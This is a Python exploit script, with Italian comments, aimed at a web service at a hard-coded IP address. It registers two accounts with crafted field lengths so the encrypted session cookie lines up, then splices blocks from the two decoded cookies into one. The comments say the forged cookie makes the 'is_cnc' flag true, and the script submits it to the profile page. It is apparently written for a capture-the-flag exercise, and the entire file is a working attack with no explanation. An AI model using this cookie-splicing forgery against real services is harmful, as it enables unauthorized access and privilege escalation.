#!/bin/env python
import requests
import json
from base64 import b64decode, b64encode

#Dalla pos 97 a 112 del cookie decodificato e' contenuto ' 0'... == True in python
reg_data1 = dict()
reg_data1["login"] = "getlast4"
reg_data1["password"] = "a"
reg_data1["localisation"] = "t"
reg_data1["model"] = "baaaaaaaaaaaa"
reg_data1["bw"] = 1
reg_data1["is_cnc"] = False

#Dalla pos 0 a 96 c'e' il restante pezzo del cookie da costruire
reg_data2 = dict()
reg_data2["login"] = "getfirst4"
reg_data2["password"] = "b"
reg_data2["localisation"] = "t"
reg_data2["model"] = "baaaaaaaaaaaaaaaaaaaaaaaaaaa"
reg_data2["bw"] = 1
reg_data2["is_cnc"] = False

log_data1 = dict()
log_data1["login"] = "getlast4"
log_data1["password"] = "a"

log_data2 = dict()
log_data2["login"] = "getfirst4"
log_data2["password"] = "b"


def serialize(reg_data):
    return [
        ('model', reg_data["model"]),
        ('localisation', reg_data["localisation"]),
        ('password', reg_data["password"]),
        ('is_cnc', reg_data["is_cnc"]),
        ('bw', reg_data["bw"]),
        ('login', reg_data["login"]),
    ]

def register(post_data):
    r = requests.post('http://131.114.59.19:9001/register', data = post_data)
    return r

def get_cookie(post_data):
    r = requests.post('http://131.114.59.19:9001/login', data=post_data, allow_redirects=False)
    return r.cookies["data"]

def send_cookie(cookie):
    cookiejar = dict()
    cookiejar["data"] = cookie
    r = requests.get('http://131.114.59.19:9001/profile', cookies=cookiejar)
    print(r.text)

print(json.dumps(serialize(reg_data1)))

reg = register(reg_data1)
reg = register(reg_data2)

cookie1 = get_cookie(log_data1)
cookie1 = b64decode(cookie1)
piece_cookie1 = cookie1[96:]

cookie2 = get_cookie(log_data2)
cookie2 = b64decode(cookie2)
piece_cookie2 = cookie2[0:96]

result_cookie = piece_cookie2 + piece_cookie1

result_cookie = b64encode(result_cookie).decode()
send_cookie(result_cookie)
